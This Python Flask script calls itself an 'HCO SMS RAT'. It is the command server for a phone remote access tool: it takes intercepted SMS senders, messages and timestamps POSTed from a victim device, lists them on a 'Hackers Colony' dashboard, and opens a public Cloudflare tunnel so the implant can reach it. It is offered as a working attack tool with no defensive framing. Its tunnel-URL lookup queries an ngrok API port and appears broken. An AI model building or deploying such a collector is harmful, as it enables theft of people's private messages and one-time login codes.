import os
import time
import json
import subprocess
from flask import Flask, request, render_template_string

PORT = 5000

app = Flask(__name__)

# HTML Dashboard Template
dashboard_template = """
<!DOCTYPE html>
<html>
<head>
    <title>HCO SMS Logger</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: 'Segoe UI', sans-serif;
            padding: 30px;
        }
        h1 {
            color: #00ffcc;
            text-align: center;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 30px;
        }
        th, td {
            border: 1px solid #444;
            padding: 12px;
            text-align: left;
        }
        th {
            background-color: #111;
            color: #00ffff;
        }
        tr:nth-child(even) {
            background-color: #1e1e1e;
        }
        .header {
            font-size: 24px;
            text-align: center;
            background-color: #1a1a1a;
            padding: 15px;
            border-radius: 10px;
            color: #00ff99;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="header">📱 Hackers Colony SMS Dashboard</div>
    <table>
        <tr>
            <th>Sender</th>
            <th>Message</th>
            <th>Timestamp</th>
        </tr>
        {% for sms in sms_data %}
        <tr>
            <td>{{ sms['sender'] }}</td>
            <td>{{ sms['message'] }}</td>
            <td>{{ sms['timestamp'] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

# Store received SMS data
sms_data = []

@app.route('/', methods=['GET'])
def dashboard():
    return render_template_string(dashboard_template, sms_data=sms_data)

@app.route('/receive_sms', methods=['POST'])
def receive_sms():
    try:
        sender = request.form.get('sender')
        message = request.form.get('message')
        timestamp = request.form.get('timestamp')

        if sender and message and timestamp:
            sms_data.append({
                "sender": sender,
                "message": message,
                "timestamp": timestamp
            })
            print(f"[+] SMS Received - From: {sender}, Time: {timestamp}")
            return "OK", 200
        else:
            return "Invalid data", 400
    except Exception as e:
        print("Error receiving SMS:", str(e))
        return "Error", 500

def start_cloudflared():
    print("[•] Starting Cloudflare Tunnel...")
    subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)

    try:
        output = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels", shell=True)
        tunnels = json.loads(output)
        public_url = tunnels['tunnels'][0]['public_url']
        print(f"[✓] Cloudflare Tunnel: {public_url}")
    except Exception as e:
        print("[×] Failed to get Cloudflare URL. Make sure cloudflared is installed.")
        public_url = None

    return public_url

def check_port_and_kill(port):
    try:
        output = subprocess.check_output(f"lsof -t -i:{port}", shell=True).decode().strip()
        if output:
            print(f"[!] Port {port} in use. Killing process...")
            os.system(f"kill -9 {output}")
    except subprocess.CalledProcessError:
        pass

if __name__ == '__main__':
    print("╔══════════════════════════════╗")
    print("║     HCO SMS RAT Started      ║")
    print("╚══════════════════════════════╝")

    check_port_and_kill(PORT)
    start_cloudflared()
    print("[•] Starting Flask server...")
    app.run(host='0.0.0.0', port=PORT)
